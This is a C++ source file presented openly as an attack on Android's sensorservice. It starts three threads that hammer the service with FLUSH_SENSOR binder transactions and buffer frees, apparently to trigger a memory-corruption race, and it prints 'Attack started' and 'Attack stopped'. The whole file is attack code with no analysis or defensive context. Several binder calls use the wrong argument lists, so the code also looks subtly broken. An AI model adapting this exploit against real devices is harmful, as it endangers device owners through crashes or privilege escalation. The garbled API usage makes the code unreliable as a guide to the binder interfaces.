#include <iostream>
#include <thread>
#include <atomic>
#include <chrono>
#include <unistd.h>
#include <sched.h>

#include <binder/IServiceManager.h>
#include <binder/IPCThreadState.h>
#include <gui/Sensor.h>
#include <gui/SensorManager.h>
#include <gui/SensorEventQueue.h>

using namespace android;

enum Signal {
    SLEEP,
    ATTACK
};

std::atomic<Signal> attack_signal(SLEEP);

void bcfree() {
    sp<ISensorManager> sensorManager = interface_cast<ISensorManager>(defaultServiceManager()->getService(String16("sensorservice")));
    sp<ISensorEventConnection> sensorEventConnection = sensorManager->createSensorEventConnection();

    while (true) {
        if (attack_signal.load() == SLEEP) {
            sched_yield();
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        sensorManager->transact(ISensorManager::FLUSH_SENSOR, sensorEventConnection);
        IPCThreadState::self()->freeBuffer();
    }
}

void bcfree_helper() {
    sp<ISensorManager> sensorManager = interface_cast<ISensorManager>(defaultServiceManager()->getService(String16("sensorservice")));
    sp<ISensorEventConnection> sensorEventConnection = sensorManager->createSensorEventConnection();

    while (true) {
        if (attack_signal.load() == SLEEP) {
            sched_yield();
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        sensorManager->transact(ISensorManager::FLUSH_SENSOR, sensorEventConnection);
        IPCThreadState::self()->freeBuffer();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

int main() {
    std::thread t1(bcfree_helper);
    std::thread t2(bcfree);
    std::thread t3(bcfree_helper);

    std::cout << "Starting the attack in 5 seconds..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    attack_signal.store(ATTACK);

    std::cout << "Attack started. Press Enter to stop the attack." << std::endl;
    std::cin.ignore();
    attack_signal.store(SLEEP);

    t1.join();
    t2.join();
    t3.join();

    std::cout << "Attack stopped." << std::endl;
    return 0;
}
